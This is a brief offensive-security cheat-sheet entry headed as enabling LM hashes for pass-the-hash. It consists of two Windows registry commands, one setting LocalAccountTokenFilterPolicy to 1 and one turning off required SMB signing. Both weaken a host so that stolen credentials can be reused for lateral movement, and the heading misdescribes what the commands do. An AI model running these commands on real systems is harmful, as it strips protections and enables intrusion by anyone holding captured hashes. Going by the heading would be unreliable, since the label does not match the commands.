## Enable LM hashes to be accepted for PTH
```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlset\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
```